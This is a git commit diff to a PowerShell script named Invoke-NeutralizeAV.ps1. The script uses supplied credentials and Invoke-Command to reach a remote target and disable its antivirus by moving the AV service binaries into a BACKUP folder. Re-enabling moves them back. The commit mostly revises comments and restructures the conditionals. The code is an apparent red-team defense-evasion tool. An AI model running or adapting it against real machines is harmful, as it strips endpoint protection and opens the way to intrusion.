0eb436527c69b982d65b0034e74b4e36a6d75f15
Curtis Brazzell <curtbraz@gmail.com>
2018-08-12 00:18:12 -0400

    Update Invoke-NeutralizeAV.ps1

--- Invoke-NeutralizeAV.ps1
+++ Invoke-NeutralizeAV.ps1
@@ -44,23 +44,23 @@ if (-not ([string]::IsNullOrEmpty($AVName)))
 Write-Host "Found $AVName on $Target.. Attempting Neutralization.."
 }
 
-# Create Backup Directory
+# If Disabling AV, Create Backup Directory
 If ($Chosenaction -eq 'Disable' -Or $Chosenaction -eq 'D' -Or $Chosenaction -eq 'disable' -Or  $Chosenaction -eq 'd'){
 Invoke-Command -ComputerName $Target -ScriptBlock {New-Item -ItemType directory -Path $args[0] | Out-Null} -credential $cred -ArgumentList $SvcDirectory"BACKUP"
-}
 
-# Move Service Files to "BACKUP" in Parent Directory
-If ($Chosenaction -eq 'Disable' -Or $Chosenaction -eq 'D' -Or $Chosenaction -eq 'disable' -Or  $Chosenaction -eq 'd'){
+# If Disabling AV, Move Service Files to "BACKUP" in Parent Directory
 Write-Host "Moving AV Service Binaries from $SvcDirectory to $SvcDirectory"BACKUP" on $Target"
 
 Invoke-Command -ComputerName $Target -ScriptBlock {Move-Item -Path ($args[0] + "\*") -Destination ($args[0] + "BACKUP\") -Force} -credential $cred -ArgumentList $SvcDirectory
 }
+
+# If Enabling AV, Move Service Files Back to Parent Directory From "BACKUP"
 If ($Chosenaction -eq 'Enable' -Or $Chosenaction -eq 'E' -Or $Chosenaction -eq 'enable' -Or $Chosenaction -eq 'e'){
 Write-Host "Moving AV Service Binaries back from $SvcDirectory"BACKUP" to $SvcDirectory on $Target"
 
 Invoke-Command -ComputerName $Target -ScriptBlock {Move-Item -Path ($args[0] + "BACKUP\*") -Destination ($args[0] + "\") -Force} -credential $cred -ArgumentList $SvcDirectory
 
-# Delete BACKUP Dir
+# If Enabling AV, Clean Up BACKUP Dir
 Write-Host "Cleaning up Backup Dir on $Target"
 
 Invoke-Command -ComputerName $Target -ScriptBlock {Remove-Item -Recurse -Force ($args[0] + "BACKUP")} -credential $cred -ArgumentList $SvcDirectory
